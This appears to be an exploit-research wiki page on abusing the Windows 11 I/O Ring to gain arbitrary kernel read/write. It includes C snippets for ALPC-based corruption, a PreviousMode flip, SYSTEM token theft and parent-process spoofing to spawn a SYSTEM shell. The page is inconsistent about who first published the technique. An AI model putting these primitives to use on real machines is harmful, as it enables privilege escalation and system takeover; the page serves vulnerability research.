---
title: Windows I/O Ring — Kernel Internals and Exploitation
permalink: /wiki/kernel/ioring/
layout: single
author_profile: true
tags:
- windows-exploit-research
- kernel-mode
- kernel
redirect_from:
- /wiki/windows-exploit-research/kernel/ioring/
---

> **Last updated:** 2026-04-11  
> **Related:** [Primitives](/wiki/kernel/primitives/), [Cve 2024 30085](/wiki/cves/CVE-2024-30085/), [Architecture](/wiki/kernel/architecture/)  
> **Tags:** `kernel-mode`, `aar`, `aaw`, `ioring`, `ntoskrnl`

## Summary

I/O Ring is a high-performance asynchronous I/O mechanism introduced in Windows 11, allowing applications to batch multiple I/O operations via a shared ring buffer and submit them with a single syscall. For exploitation, I/O Ring's `IORING_OBJECT.RegBuffers` field — a pointer to an array of `IOP_MC_BUFFER_ENTRY` structures — can be corrupted via a single controlled kernel write to achieve unrestricted **arbitrary kernel read/write (AAR/AAW)** for all subsequent operations.

**Origin**: This technique was **first published by Yarden Shafir** (Windows Internals) at TyphoonCon 2022 and in a blog post on 2022-07-05. It applies to Windows 11 22H2+ and is also analogous to the Linux io_uring registered buffers mechanism. The technique was later incorporated into the CVE-2024-30085 exploit chain (Alexandre Borges, ERS_07/08, 2026).

**Windows lacks SMAP**: A key enabler — the kernel can freely dereference userland pointers (e.g., `RegBuffers` pointing to a user-mode fake array). Linux has SMAP (since 2012), which would block this technique in its basic form.

---

## Architecture Overview

```
User-Mode Application
        │
        │  CreateIoRing, BuildIoRingReadFile/WriteFile, SubmitIoRing
        ▼
Kernel I/O Ring machinery
        │
        ├── Submission Queue (shared memory region, application → kernel)
        │      Contains: IORING_SQE entries describing I/O operations
        │
        ├── IORING_OBJECT (kernel object, one per CreateIoRing call)
        │      Contains: RegBuffers → IOP_MC_BUFFER_ENTRY[]
        │                RegBuffersCount
        │
        ├── IOP_MC_BUFFER_ENTRY (one per registered buffer)
        │      Contains: Address (source/destination of I/O)
        │                Length
        │
        └── Completion Queue (shared memory, kernel → application)
               Contains: IORING_CQE entries with results
```

**Core operation**: Applications describe I/O operations referencing registered buffer indices instead of raw addresses. The kernel resolves each index through `RegBuffers[index] → IOP_MC_BUFFER_ENTRY.Address` at submission time. This indirection is the exploit primitive.

**Three versions**: I/O Ring implementation has changed across Win11 builds. Exploits targeting one build may not work on others:
- Windows 11 21H2: version 1
- Windows 11 22H2: version 2  
- Windows 11 23H2+: version 3

---

## Key Kernel Structures

### IORING_OBJECT (~0xD0 bytes)

```c
typedef struct _IORING_OBJECT {
    SHORT   Type;                              //0x00
    SHORT   Size;                              //0x02
    // 4 bytes padding
    NT_IORING_INFO             UserInfo;       //0x08 (shared memory descriptor)
    PVOID                      Section;        //0x38
    PNT_IORING_SUBMISSION_QUEUE SubmissionQueue; //0x40
    PMDL                       CompletionQueueMdl; //0x48
    PNT_IORING_COMPLETION_QUEUE CompletionQueue;  //0x50
    ULONG64                    ViewSize;       //0x58
    LONG                       InSubmit;       //0x60
    // padding to 0x68
    ULONG64                    CompletionLock; //0x68
    ULONG64                    SubmitCount;    //0x70
    ULONG64                    CompletionCount; //0x78
    ULONG64                    CompletionWaitUntil; //0x80
    KEVENT                     CompletionEvent; //0x88
    UCHAR                      SignalCompletionEvent; //0xA0
    // padding to 0xA8
    PKEVENT                    CompletionUserEvent; //0xA8
    ULONG                      RegBuffersCount; // 0xB0  ← EXPLOIT TARGET
    // 4 bytes padding to 0xB8
    IOP_MC_BUFFER_ENTRY**      RegBuffers;      // 0xB8  ← EXPLOIT TARGET
    ULONG                      RegFilesCount;   // 0xC0
    // padding to 0xC8
    PVOID*                     RegFiles;        // 0xC8
} IORING_OBJECT;
```

**Exploit targets:** `RegBuffersCount` (+0xB0) and `RegBuffers` (+0xB8) are adjacent in memory. A 16-byte write overwrites both simultaneously — exactly the size written by the ALPC `ExtensionBuffer` write technique.

### IOP_MC_BUFFER_ENTRY (0x80 bytes)

```c
typedef struct _IOP_MC_BUFFER_ENTRY {
    USHORT          Type;             //0x00 — kernel object type tag
    USHORT          Reserved;         //0x02
    ULONG           Size;             //0x04
    ULONG           ReferenceCount;   //0x08
    ULONG           Flags;            //0x0C
    LIST_ENTRY      GlobalDataLink;   //0x10
    PVOID           Address;          //0x20  ← I/O source or destination address
    ULONG           Length;           //0x28  ← bytes to transfer
    CHAR            AccessMode;       //0x2C  (0=Kernel, 1=User)
    // 3 bytes padding
    LONG            MdlRef;           //0x30
    // 4 bytes padding
    PMDL            Mdl;              //0x38
    KEVENT          MdlRundownEvent;  //0x40
    PULONG64        PfnArray;         //0x58
    BYTE            PageNodes[0x20];  //0x60
} IOP_MC_BUFFER_ENTRY; // 0x80 bytes
```

**Key fields**: `Address` and `Length` define where kernel reads from / writes to for each I/O Ring operation. During legitimate use, these are validated user-mode addresses. During exploitation, they are replaced with arbitrary kernel addresses via `RegBuffers` corruption.

### HIORING (User-Mode Structure)

```c
typedef struct _HIORING {
    HANDLE  handle;                  // user-mode handle
    NT_IORING_INFO Info;             // ring info (shared memory map)
    ULONG   IoRingKernelAcceptedVersion;
    PVOID   RegBufferArray;          // pointer to registered buffer array
    ULONG   BufferArraySize;         // count of registered buffers
    PVOID   Unknown;
    ULONG   FileHandlesCount;
    ULONG   SubQueueHead;
    ULONG   SubQueueTail;
} HIORING;
```

**Important for exploit**: `handle` field is the Windows kernel object handle — used with `NtQuerySystemInformation(SystemExtendedHandleInformation=64)` to find the kernel address of the `IORING_OBJECT`.

---

## User-Mode API

```c
// Create an I/O Ring object
HRESULT CreateIoRing(
    IORING_VERSION      ioringVersion,   // IORING_VERSION_1/2/3
    IORING_CREATE_FLAGS flags,
    UINT32              submissionQueueSize,
    UINT32              completionQueueSize,
    HIORING*            h                // output handle
);

// Register buffers (each validated as user-mode, pages locked, IOP_MC_BUFFER_ENTRY created)
HRESULT BuildIoRingRegisterBuffers(
    HIORING                   ioRing,
    UINT32                    count,
    IORING_BUFFER_INFO const* buffers,   // array of {Address, Length}
    UINT_PTR                  userData
);

// Queue a read operation: reads from 'fileRef' into registered buffer 'bufferRef'
// From kernel POV: file → RegBuffers[bufferRef.index].Address
HRESULT BuildIoRingReadFile(
    HIORING          ioRing,
    IORING_HANDLE_REF fileRef,    // source file handle
    IORING_BUFFER_REF bufferRef,  // destination buffer (by index)
    UINT32           numberOfBytesToRead,
    UINT64           fileOffset,
    UINT_PTR         userData,
    IORING_SQE_FLAGS sqeFlags
);

// Queue a write operation: writes from registered buffer 'bufferRef' into 'fileRef'
// From kernel POV: RegBuffers[bufferRef.index].Address → file
HRESULT BuildIoRingWriteFile(
    HIORING           ioRing,
    IORING_HANDLE_REF fileRef,    // destination file handle
    IORING_BUFFER_REF bufferRef,  // source buffer (by index)
    UINT32            numberOfBytesToWrite,
    UINT64            fileOffset,
    FILE_WRITE_FLAGS  writeFlags,
    UINT_PTR          userData,
    IORING_SQE_FLAGS  sqeFlags
);

// Submit all queued operations (batch syscall)
HRESULT SubmitIoRing(HIORING ioRing, UINT32 waitOperations, UINT32 milliseconds, UINT32* submittedEntries);

// Dequeue one completion result
HRESULT PopIoRingCompletion(HIORING ioRing, IORING_CQE* cqe);

// Tear down
HRESULT CloseIoRing(HIORING ioRing);
```

---

## Exploit Technique: ALPC Bootstrap → I/O Ring AAR/AAW

### Overview

The key insight (ERS_07/08 — Alexandre Borges, 2026):

> Use the **one-shot ALPC write primitive** (from a pool overflow) to corrupt `IORING_OBJECT.RegBuffers` and `RegBuffersCount`. After this single write, every subsequent `BuildIoRingReadFile` / `BuildIoRingWriteFile` + `SubmitIoRing` call operates with kernel-controlled source/destination addresses — providing **unlimited AAR and AAW**.

This trades the one-shot ALPC write for an unlimited I/O Ring primitive.

### Step-by-Step

**Setup (before overflow):**
```c
// 1. Create I/O Ring (any version matching target Windows build)
HIORING hIoRing;
CreateIoRing(IORING_VERSION_3, {}, 256, 256, &hIoRing);

// 2. DO NOT call BuildIoRingRegisterBuffers
//    (would validate addresses as user-mode — we don't want that)

// 3. Allocate fake structures in user-mode (SMAP not enabled on Windows)
PVOID g_fake_buffers_array = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
PVOID g_fake_buffer_entry  = VirtualAlloc(NULL, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

// g_fake_buffers_array[0] = pointer to g_fake_buffer_entry
*(PVOID*)g_fake_buffers_array = g_fake_buffer_entry;
```

**Find IORING_OBJECT kernel address:**
```c
// Get the kernel handle value from HIORING
HANDLE kernelHandle = *(HANDLE*)((BYTE*)hIoRing + HIORING_OFFSET_KERNEL_HANDLE);

// Enumerate all handles via NtQuerySystemInformation(SystemExtendedHandleInformation=64)
// Match on our PID + kernelHandle value → Object field = IORING_OBJECT kernel address
ULONG64 ioringObjectAddr = FindIoRingObjectAddress(hIoRing);
// IORING_OBJECT.RegBuffersCount is at ioringObjectAddr + 0xB0
```

**ALPC bootstrap (the one-shot write):**
```c
// Build fake KALPC_RESERVE (in user-mode)
g_fake_kalpc_reserve_object->Message = (PVOID)g_fake_kalpc_message_object;

// Build fake KALPC_MESSAGE (in user-mode)
// Target: IORING_OBJECT.RegBuffersCount at offset +0xB0
g_fake_kalpc_message_object->ExtensionBuffer     = (PVOID)(ioringObjectAddr + 0xB0);
g_fake_kalpc_message_object->ExtensionBufferSize = 0x10;  // 16 bytes: overwrites RegBuffersCount + RegBuffers

// ALPC message payload (16 bytes written to ExtensionBuffer):
ULONG64 payload[2];
payload[0] = 1;                         // RegBuffersCount = 1 (one fake buffer registered)
payload[1] = (ULONG64)g_fake_buffers_array; // RegBuffers = our fake array in user-mode

// Corrupt ALPC handle table entry to point to fake reserve (via WNF OOB write)
// Then:
NtAlpcSendWaitReceivePort(alpcPort, 0, &alpcMessage, ...);
// Kernel follows: HandleTable → fake KALPC_RESERVE → fake KALPC_MESSAGE
//                 → ExtensionBuffer (IORING_OBJECT+0xB0)
//                 → writes payload → RegBuffersCount=1, RegBuffers=g_fake_buffers_array
```

**AAR (kernel read) — via I/O Ring write:**
```c
// "I/O Ring write" = BuildIoRingWriteFile = reads from kernel buffer → writes to pipe
// Naming from kernel POV; from exploit POV this is a READ from kernel address

void IoRingReadKernel(ULONG64 kernelAddr, PVOID outBuf, ULONG size) {
    // Set fake entry to read from kernelAddr
    ((IOP_MC_BUFFER_ENTRY*)g_fake_buffer_entry)->Address = (PVOID)kernelAddr;
    ((IOP_MC_BUFFER_ENTRY*)g_fake_buffer_entry)->Length  = size;

    // BuildIoRingWriteFile: kernel reads from RegBuffers[0]->Address → writes to output_pipe
    BuildIoRingWriteFile(hIoRing,
        IoRingHandleRefFromHandle(g_output_pipe_client),  // kernel writes here
        IoRingBufferRefFromIndexAndOffset(0, 0),          // RegBuffers[0] = our fake entry
        size, 0, 0, 0, IOSQE_FLAGS_NONE);
    SubmitIoRing(hIoRing, 1, INFINITE, NULL);
    PopIoRingCompletion(hIoRing, &cqe);

    // Retrieve from output pipe (server end)
    ReadFile(g_output_pipe_server, outBuf, size, &bytesRead, NULL);
}
```

**AAW (kernel write) — via I/O Ring read:**
```c
// "I/O Ring read" = BuildIoRingReadFile = reads from pipe → writes to kernel buffer
// From exploit POV this is a WRITE to kernel address

void IoRingWriteKernel(ULONG64 kernelAddr, PVOID inBuf, ULONG size) {
    // Set fake entry to write to kernelAddr
    ((IOP_MC_BUFFER_ENTRY*)g_fake_buffer_entry)->Address = (PVOID)kernelAddr;
    ((IOP_MC_BUFFER_ENTRY*)g_fake_buffer_entry)->Length  = size;

    // Write data into input pipe first
    WriteFile(g_input_pipe_server, inBuf, size, &bytesWritten, NULL);

    // BuildIoRingReadFile: kernel reads from input_pipe → writes to RegBuffers[0]->Address
    BuildIoRingReadFile(hIoRing,
        IoRingHandleRefFromHandle(g_input_pipe_client),   // kernel reads from here
        IoRingBufferRefFromIndexAndOffset(0, 0),          // destination = RegBuffers[0]
        size, 0, 0, IOSQE_FLAGS_NONE);
    SubmitIoRing(hIoRing, 1, INFINITE, NULL);
    PopIoRingCompletion(hIoRing, &cqe);
}
```

### Named Pipe Setup

Pipes serve only as data transport channels — not as exploit primitives:

```c
// Input pipe: user-mode writes, kernel reads (for write operations)
CreateNamedPipeW(L"\\\\.\\pipe\\ioring_input_<PID>",
    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 0x1000, 0x1000, 0, NULL);

// Output pipe: kernel writes, user-mode reads (for read operations)
CreateNamedPipeW(L"\\\\.\\pipe\\ioring_output_<PID>",
    PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE, 1, 0x1000, 0x1000, 0, NULL);

// CRITICAL: PIPE_TYPE_BYTE required — I/O Ring transfers raw byte streams, not messages
```

### Operational Naming Confusion

| I/O Ring API | Kernel Operation | Exploit Operation |
|-------------|-----------------|------------------|
| `BuildIoRingWriteFile` | Kernel reads from `RegBuffers[i].Address`, writes to file handle | **Exploit READ** from kernel address to pipe |
| `BuildIoRingReadFile`  | Kernel reads from file handle, writes to `RegBuffers[i].Address` | **Exploit WRITE** from pipe to kernel address |

The naming is from the kernel's perspective relative to the file handle.

---

## CVE-2024-30085: Exploit Variant Evolution

Alexandre Borges documented four exploit variants against CVE-2024-30085, each building on the previous:

| Variant | Technique | Overflows | Key Innovation |
|---------|-----------|-----------|----------------|
| `exploit_alpc_edition.c` (ERS_06) | ALPC write → token overwrite; pipe attr AAR | 2 | First working PoC; one-shot ALPC limitation |
| `exploit_token_stealing_edition.c` (ERS_07) | ALPC write → PreviousMode=0 → NtWriteVirtualMemory; pipe attr AAR | 2 | PreviousMode flip converts one-shot to unlimited write; clean restore |
| `exploit_ioring_edition_01.c` (ERS_07) | ALPC → I/O Ring write; pipe attr AAR | 2 | 8-byte precision writes; still needs second overflow for reads |
| `exploit_ioring_edition_02.c` (ERS_08) | ALPC → I/O Ring read+write | **1** | Single overflow; 15 stages; no pipe exploitation |

### Token Steal via PreviousMode (token_stealing_edition)

**Key insight**: The ALPC one-shot write is too valuable to spend on token overwrite directly — because then no write remains to restore `PipeAttr.Flink` (left pointing to userland), causing kernel crash at process exit. Instead:

1. Use ALPC write to set `_KTHREAD.PreviousMode = 0` (KernelMode)
2. `NtWriteVirtualMemory` now accepts kernel addresses (unlimited AAW)
3. Write raw SYSTEM token to `EPROCESS.Token`
4. Restore `PipeAttr.Flink` via `NtWriteVirtualMemory`
5. Restore `PreviousMode = 1` before process exit

```c
// ALPC write target: KTHREAD.PreviousMode
g_fake_kalpc_message_object->ExtensionBuffer     = (PVOID)(kthreadAddr + 0x232);
g_fake_kalpc_message_object->ExtensionBufferSize = 0x10;  // minimum is 0x10, not 0x08
BYTE zeroPayload[16] = {0};
NtAlpcSendWaitReceivePort(..., zeroPayload, ...);
// PreviousMode now = 0 (KernelMode)

// Unlimited write via NtWriteVirtualMemory
NtWriteVirtualMemory(INVALID_HANDLE_VALUE, (PVOID)eprocessTokenAddr,
                     &g_system_token_raw, 8, NULL);
NtWriteVirtualMemory(INVALID_HANDLE_VALUE, (PVOID)corruptedPipeAttrFlink,
                     &originalFlink, 8, NULL);
NtWriteVirtualMemory(INVALID_HANDLE_VALUE, (PVOID)(kthreadAddr + 0x232),
                     &one, 1, NULL); // restore PreviousMode to 1
```

**Critical**: `_EX_FAST_REF` token field stores pointer in bits 63:4 and refcount in bits 3:0. Must copy the **raw token value** (all 64 bits), not just the pointer.

### KTHREAD Address Discovery

Performed early (before any spray) to avoid interference:

```c
// Duplicate own thread handle
HANDLE hThread;
DuplicateHandle(GetCurrentProcess(), GetCurrentThread(), GetCurrentProcess(),
                &hThread, 0, FALSE, DUPLICATE_SAME_ACCESS);

// Enumerate all handles
NtQuerySystemInformation(64 /*SystemExtendedHandleInformation*/,
                          buffer, bufSize, &retLen);

// Find entry matching our PID + handle value
for each entry in buffer:
    if (entry.UniqueProcessId == GetCurrentProcessId() &&
        entry.HandleValue == (ULONG_PTR)hThread):
        g_our_kthread = (ULONG64)entry.Object; // kernel address of _KTHREAD
```

### Parent Process Spoofing (for SYSTEM shell)

Used in `exploit_alpc_edition.c` — spawns a child process with winlogon as its parent, inheriting SYSTEM token context:

```c
// Open winlogon (requires SeDebugPrivilege or SYSTEM token already set)
NtOpenProcess(&hWinlogon, PROCESS_CREATE_PROCESS, &oa, &clientId_winlogon);

// Set parent process attribute
STARTUPINFOEXW siex = {};
InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &attrSize);
UpdateProcThreadAttribute(siex.lpAttributeList, 0,
    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hWinlogon, sizeof(HANDLE), NULL, NULL);

CreateProcessW(NULL, L"cmd.exe", NULL, NULL, FALSE,
               CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT,
               NULL, NULL, &siex.StartupInfo, &pi);
// Resulting process inherits winlogon's SYSTEM token
```

Note: The `token_stealing_edition` variant avoids parent spoofing entirely — the exploit process's own token is replaced, so `CreateProcessW` directly spawns a SYSTEM shell without needing `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.

---

## Exploit Relevance

- I/O Ring as AAR/AAW: discovered ~2022 (Pwn2Own/BlackHat context), first documented publicly for Windows LPE in ERS_07/08 (2026)
- Available on all Windows 11 systems; three version variants require version-aware exploitation
- Single-overflow exploit (15 stages) is significantly more reliable and cleaner than dual-overflow approaches
- No dependency on pipe attribute corruption for reads — eliminates entire second spray+overflow phase
- ALPC bootstrap requires only 3 values from the first-wave overflow: `g_victim_index`, `g_saved_reserve_handle`, `g_alpc_ports`

---

## Arbitrary Increment → IoRing Bootstrap

An arbitrary increment bug (e.g., CVE-2024-30090) can bootstrap this technique without a full arbitrary write:

1. Increment `IORING_OBJECT.RegBuffers` from `0` to a user-mode address like `0x1000000` by incrementing the **3rd byte** once (0 → 1 at byte 2 = +0x010000).
2. Increment `IORING_OBJECT.RegBuffersCount` from `0` to `1` (one increment at byte 0).

**Caveat (CVE-2024-30090 specific)**: The KS increment primitive (`KsIncrementCountedWorker`) calls `KsQueueWorkItem` when the original value is 0, causing BSoD. So `RegBuffers` (starts at 0) cannot be incremented with that specific bug. Alternative: use the technique to increment `nt!SeDebugPrivilege` (see [Cve 2024 30090](/wiki/cves/CVE-2024-30090/)).

## References

- Yarden Shafir (Windows Internals), "One I/O Ring to Rule Them All: A Full Read/Write Exploit Primitive on Windows 11", windows-internals.com, 2022-07-05 — **original publication of this technique** (TyphoonCon 2022)
- Yarden Shafir, PoC: github.com/yardenshafir/IoRingReadWritePrimitive
- Alexandre Borges, "Exploiting Reversing (ER) Series — Article 07: Exploitation Techniques | CVE-2024-30085 (part 01)", exploitreversing.com, March 2026
- Alexandre Borges, "Exploiting Reversing (ER) Series — Article 08: Exploitation Techniques | CVE-2024-30085 (part 02)", exploitreversing.com, March 2026
- Alexandre Borges, "Exploiting Reversing (ER) Series — Article 06: A Deep Dive Into Exploiting a Minifilter Driver (N-day)", exploitreversing.com, March 2026
- Cherie-Anne Lee (StarLabs), "All I Want for Christmas is a CVE-2024-30085 Exploit", 2024-12
